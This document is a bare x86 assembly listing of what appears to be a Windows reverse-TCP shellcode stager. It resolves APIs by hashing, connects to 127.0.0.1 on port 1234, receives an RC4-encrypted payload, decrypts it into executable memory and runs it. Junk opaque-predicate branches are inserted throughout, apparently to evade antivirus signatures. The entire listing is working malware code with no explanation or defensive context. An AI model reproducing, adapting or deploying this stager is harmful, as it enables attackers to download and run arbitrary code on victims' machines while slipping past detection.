```asm
_start:
    cld
    call L_95
RET_6:
    pushal
    pushfd
    push eax
    xor eax, eax
    jnz bogus_1
    jmp real_1
bogus_1:
    nop
    mov eax, eax
real_1:
    pop eax
    popfd
    mov ebp, esp
    xor edx, edx
    mov edx, dword ptr fs:[edx + 0x30]
    mov edx, dword ptr [edx + 0xc]
    mov edx, dword ptr [edx + 0x14]
L_15:
    mov esi, dword ptr [edx + 0x28]
    xor edi, edi
    movzx ecx, word ptr [edx + 0x26]
L_1e:
    xor eax, eax
    lodsb al, byte ptr [esi]
    cmp al, 0x61
    jl L_27
    sub al, 0x20
L_27:
    ror edi, 0xd
    add edi, eax
    dec ecx
    jne L_1e
    pushfd
    push eax
    xor eax, eax
    jnz bogus_2
    jmp real_2
bogus_2:
    nop
    mov eax, eax
real_2:
    pop eax
    popfd
    push edx
    mov edx, dword ptr [edx + 0x10]
    push edi
    mov eax, dword ptr [edx + 0x3c]
    add eax, edx
    mov eax, dword ptr [eax + 0x78]
    test eax, eax
    je L_8c
    add eax, edx
    mov ecx, dword ptr [eax + 0x18]
    mov ebx, dword ptr [eax + 0x20]
    add ebx, edx
    push eax
L_4b:
    test ecx, ecx
    je L_8b
    dec ecx
    mov esi, dword ptr [ebx + ecx*4]
    add esi, edx
    xor edi, edi
L_57:
    xor eax, eax
    ror edi, 0xd
    lodsb al, byte ptr [esi]
    add edi, eax
    cmp al, ah
    jne L_57
    add edi, dword ptr [ebp - 8]
    cmp edi, dword ptr [ebp + 0x24]
    jne L_4b
    pop eax
    mov ebx, dword ptr [eax + 0x24]
    add ebx, edx
    mov cx, word ptr [ebx + ecx*2]
    mov ebx, dword ptr [eax + 0x1c]
    add ebx, edx
    mov eax, dword ptr [ebx + ecx*4]
    add eax, edx
    mov dword ptr [esp + 0x24], eax
    pop ebx
    pop ebx
    popal
    pop ecx
    pop edx
    push ecx
    jmp eax
L_8b:
    pop eax
L_8c:
    pop edi
    pop edx
    mov edx, dword ptr [edx]
    jmp L_15
L_95:
    pop ebp
    pushfd
    push eax
    xor eax, eax
    jnz bogus_3
    jmp real_3
bogus_3:
    nop
    mov eax, eax
real_3:
    pop eax
    popfd
    push 0x3233
    push 0x5f327377
    push esp
    push 0x726774c
    mov eax, ebp
    call eax
    mov eax, 0x190
    sub esp, eax
    push esp
    push eax
    push 0x6b8029
    call ebp
    push 0xa
L_bc:
    push 0x100007f
    push 0xd2040002
    mov esi, esp
    push eax
    push eax
    push eax
    push eax
    inc eax
    push eax
    inc eax
    push eax
    push 0xe0df0fea
    call ebp
    xchg edi, eax
L_d8:
    push 0x10
    push esi
    push edi
    push 0x6174a599
    call ebp
    test eax, eax
    je L_f1
    dec dword ptr [esi + 8]
    jne L_d8
L_ec:
    call L_1cd
L_f1:
    push 0
    push 4
    push esi
    push edi
    push 0x5fc8d902
    call ebp
    cmp eax, 0
    jle L_14c
    mov esi, dword ptr [esi]
    xor esi, 0xd3a205a0
    lea ecx, [esi + 0x100]
    push 0x40
    push 0x1000
    push ecx
    push 0
    push 0xe553a458
    call ebp
    lea ebx, [eax + 0x100]
    push ebx
    push esi
    push eax
L_12b:
    push 0
    push esi
    push ebx
    push edi
    push 0x5fc8d902
    call ebp
    cmp eax, 0
    jge L_164
    pop eax
    push 0x4000
    push 0
    push eax
    push 0x300f2f0b
    call ebp
L_14c:
    push edi
    push 0x614d6e75
    call ebp
    pop esi
    pop esi
    dec dword ptr [esp]
    jne L_bc
    jmp L_ec
L_164:
    pushfd
    push eax
    xor eax, eax
    jnz bogus_4
    jmp real_4
bogus_4:
    nop
    mov eax, eax
real_4:
    pop eax
    popfd
    add ebx, eax
    sub esi, eax
    jne L_12b
    pop ebx
    pop ecx
    pop ebp
    push ebp
    push edi
    mov edi, ebx
    call L_186
    .byte 0x34, 0x2A, 0x68, 0x7E, 0xA2, 0xD0, 0x53, 0x60
    .byte 0xC9, 0x53, 0x10, 0x7A, 0xCB, 0xE8, 0x3E, 0x08
L_186:
    .byte 0x5E, 0x31, 0xC0, 0xAA, 0xFE, 0xC0, 0x75, 0xFB
    .byte 0x81, 0xEF, 0x00, 0x01, 0x00, 0x00, 0x31, 0xDB
L_196:
    .byte 0x02, 0x1C, 0x07, 0x89, 0xC2, 0x80, 0xE2, 0x0F
    .byte 0x02, 0x1C, 0x16, 0x8A, 0x14, 0x07, 0x86, 0x14
    .byte 0x1F, 0x88, 0x14, 0x07, 0xFE, 0xC0, 0x75, 0xE8
    .byte 0x31, 0xDB
L_1b0:
    .byte 0xFE, 0xC0, 0x02, 0x1C, 0x07, 0x8A, 0x14, 0x07
    .byte 0x86, 0x14, 0x1F, 0x88, 0x14, 0x07, 0x02, 0x14
    .byte 0x1F, 0x8A, 0x14, 0x17, 0x30, 0x55, 0x00, 0x45
    .byte 0x49, 0x75, 0xE5, 0x5F, 0xC3
L_1cd:
    .byte 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x6A, 0x00, 0x53
    .byte 0xFF, 0xD5
```